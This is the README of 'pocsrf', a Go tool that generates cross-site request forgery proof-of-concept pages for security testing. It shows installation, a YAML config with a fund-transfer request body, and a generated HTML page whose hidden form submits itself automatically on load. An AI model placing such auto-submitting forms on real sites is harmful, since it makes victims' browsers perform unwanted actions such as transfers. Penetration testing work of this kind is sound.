# pocsrf
Yet another csrf generator.

# Installation
```bash
$ git clone https://github.com/lateralusd/pocsrf.git && cd ./pocsrf
$ go build
$ ./pocsrf -help
generate html template

Usage:
  pocsrf [command]

Available Commands:
  gen         generate sample config file
  help        Help about any command
  run         create html file

Flags:
  -h, --help   help for pocsrf

Use "pocsrf [command] --help" for more information about a command.
```

# Usage
You can use it as a standalone binary, or as a library.

## Standalone binary

First generate config file and fill it accordingly.

```bash
$ ./pocsrf gen 
File cfg.yaml created successfully
$ cat cfg.yaml
url: https://www.google.com
method: POST
headers:
    - 'Content-Type: application/json'
    - 'X-Requested-With: XMLHttpRequest'
body: action=transfer&amount=15
```

* `headers` field will be used for json POC and they have to be comma separated
* `body` will contain the body of request, either json or good ol http post body

After you have edited config file, all you need to do is is call `pocsrf run -i <configFilename.yaml> -o output.html -j`

In our case:
```bash
$ pocsrf run -i cfg.yaml -o output.html
$ cat output.html
<html>
<body>
<form action="https://www.google.com" method="POST">

<input type="hidden" name="action" value="transfer"/>
<input type="hidden" name="amount" value="15"/>

</form>
<script>
	document.forms[0].submit();
</script>
</body>
</html>
```
